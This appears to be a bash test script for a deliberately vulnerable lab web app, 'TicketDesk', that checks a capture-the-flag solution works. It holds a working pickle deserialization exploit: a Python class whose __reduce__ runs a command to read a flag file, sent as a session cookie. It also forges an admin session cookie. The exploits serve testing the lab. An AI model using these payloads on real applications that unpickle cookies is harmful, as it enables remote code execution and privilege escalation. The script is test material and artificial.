#!/usr/bin/env bash
set -e
DC=$(docker compose version &>/dev/null && echo "docker compose" || echo "docker-compose")

$DC down 2>/dev/null || true
$DC up --build -d
trap "$DC down" EXIT

echo "[*] Waiting for TicketDesk on port 8082..."
for i in $(seq 1 30); do
  nc -z -w2 127.0.0.1 8082 2>/dev/null && break
  sleep 2
  if [ "$i" -eq 30 ]; then
    echo "[FAIL] Service did not come up"
    $DC logs; exit 1
  fi
done
sleep 1

FAIL=0

# --- 1: login page renders ---
echo ""
echo "[*] Test 1 — login page renders"
OUT=$(curl -sf http://127.0.0.1:8082/login)
if echo "$OUT" | grep -q "TicketDesk"; then
  echo "[PASS] login page renders"
else
  echo "[FAIL] login page: $OUT"; FAIL=1
fi

# --- 2: normal login works ---
echo ""
echo "[*] Test 2 — normal login with alice"
ALICE_COOKIE=$(curl -sf -c - -X POST http://127.0.0.1:8082/login \
  -d "username=alice&password=alice123" 2>/dev/null | grep 'session' | awk '{print $NF}')
if [ -n "$ALICE_COOKIE" ]; then
  echo "[PASS] alice login succeeds"
else
  echo "[FAIL] alice login: no session cookie"; FAIL=1
fi

# --- 3: pickle RCE reads flag1 ---
echo ""
echo "[*] Test 3 — pickle deserialization reads flag1"
PAYLOAD=$(python3 - << 'PYEOF'
import pickle, subprocess, base64

class RCE:
    def __reduce__(self):
        return (subprocess.check_output, (['cat', '/flag1.txt'],))

print(base64.b64encode(pickle.dumps(RCE())).decode())
PYEOF
)
OUT=$(curl -sf http://127.0.0.1:8082/ -b "session=$PAYLOAD")
if echo "$OUT" | grep -qE 'POC\{[0-9a-f]{32}\}'; then
  FLAG1=$(echo "$OUT" | grep -oE 'POC\{[0-9a-f]{32}\}' | head -1)
  echo "[PASS] pickle RCE: flag1 = $FLAG1"
else
  echo "[FAIL] pickle RCE for flag1: $OUT"; FAIL=1
fi

# --- 4: forged admin pickle accesses admin panel (flag2) ---
echo ""
echo "[*] Test 4 — forged admin session accesses admin panel"
ADMIN_COOKIE=$(python3 - << 'PYEOF'
import pickle, base64
print(base64.b64encode(pickle.dumps({"username": "hacker", "role": "admin"})).decode())
PYEOF
)
OUT=$(curl -sf http://127.0.0.1:8082/admin -b "session=$ADMIN_COOKIE")
if echo "$OUT" | grep -qE 'POC\{[0-9a-f]{32}\}'; then
  FLAG2=$(echo "$OUT" | grep -oE 'POC\{[0-9a-f]{32}\}' | head -1)
  echo "[PASS] forged admin session: flag2 = $FLAG2"
else
  echo "[FAIL] forged admin session: $OUT"; FAIL=1
fi

# --- 5: legitimate user cannot access admin ---
echo ""
echo "[*] Test 5 — regular session cannot access admin panel"
LEGIT_COOKIE=$(python3 - << 'PYEOF'
import pickle, base64
print(base64.b64encode(pickle.dumps({"username": "alice", "role": "user"})).decode())
PYEOF
)
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" http://127.0.0.1:8082/admin -b "session=$LEGIT_COOKIE" || true)
if [ "$HTTP_CODE" = "403" ]; then
  echo "[PASS] regular user gets 403 on admin panel"
else
  echo "[FAIL] expected 403, got $HTTP_CODE"; FAIL=1
fi

echo ""
if [ "$FAIL" -eq 0 ]; then
  echo "[PASS] All tests passed"
  exit 0
else
  echo "[FAIL] One or more tests failed"
  exit 1
fi
